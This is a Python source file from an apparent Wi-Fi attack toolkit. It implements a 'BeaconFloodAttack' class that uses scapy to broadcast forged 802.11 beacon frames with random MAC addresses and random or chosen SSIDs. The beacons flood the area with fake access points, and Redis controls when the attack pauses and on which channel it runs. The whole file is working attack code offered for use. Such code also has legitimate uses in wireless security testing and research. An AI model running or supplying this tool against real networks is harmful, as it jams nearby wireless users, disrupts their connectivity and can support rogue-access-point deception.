# all management frame attacks here
import time
import uuid
import logging
from time import sleep

from redis import StrictRedis
from scapy.all import sendp
from scapy.layers.dot11 import (
    Dot11,
    Dot11Elt,
    Dot11Beacon,
    RadioTap
)

from wifi_tools import WiFiProcess
from wifi_tools.utils import (
    channel_to_frequency,
    random_mac_address,
)
from wifi_tools.settings import AP_RATES, RSN, REDIS_URI

logger = logging.getLogger(__name__)


class BeaconFloodAttack(WiFiProcess):

    def __init__(self, iface, ssids=None):
        self.iface = iface
        self.redis_server = StrictRedis(REDIS_URI)
        self.ssids = ssids
        self.boottime = time.time()
        self.ieee8021x = 0
        self.sc = 0
        super(BeaconFloodAttack, self).__init__()

    def tick(self):
        beacon_flood = self.redis_server.get('current_attack') == 'beacon_flood'
        if not beacon_flood:
            logger.debug('Beacon attack paused')
            sleep(1)
            return

        if self.ssids:
            for ssid in self.ssids:
                self.send_dot11_beacon(ssid)
        else:
            random_ssid = str(uuid.uuid4()).replace('-', '')
            # unichr(choice((0x300, 0x2000)) + randint(0, 0xff))
            self.send_dot11_beacon(random_ssid)

        sleep(0.1)

    def radiotap_header(self, channel):
        radiotap_packet = RadioTap(len=18, present='Flags+Rate+Channel+dBm_AntSignal+Antenna', notdecoded='\x00\x6c' + channel_to_frequency(channel) + '\xc0\x00\xc0\x01\x00\x00')
        return radiotap_packet

    def send_dot11_beacon(self, ssid):
        # ProbeRequestFloodSniffer will send the probe response
        channel = int(self.redis_server.get('current_channel'))
        logger.debug('Sending beacon on channel {0} with ssid {1}'.format(channel, ssid))
        # Create beacon packet
        mac = random_mac_address()
        self.redis_server.lpush('flood_macs', mac)
        beacon_packet = RadioTap()                                                    \
                     / Dot11(subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=mac, addr3=mac) \
                     / Dot11Beacon(cap=0x2105)                                                           \
                     / Dot11Elt(ID='SSID', info=ssid)                                                    \
                     / Dot11Elt(ID='Rates', info=AP_RATES)                                               \
                     / Dot11Elt(ID='DSset', info=chr(channel))

        if self.ieee8021x:
            beacon_packet[Dot11Beacon].cap = 0x3101
            rsn_info = Dot11Elt(ID='RSNinfo', info=RSN)
            beacon_packet = beacon_packet / rsn_info

        # Update sequence number
        beacon_packet.SC = self.next_sc()

        # Update timestamp
        beacon_packet[Dot11Beacon].timestamp = self.current_timestamp()

        # Send
        sendp(beacon_packet, iface=self.iface, verbose=False)

    def next_sc(self):
        self.sc = (self.sc + 1) % 4096
        temp = self.sc

        return temp * 16  # Fragment number -> right 4 bits

    def current_timestamp(self):
        return (time.time() - self.boottime) * 1000000
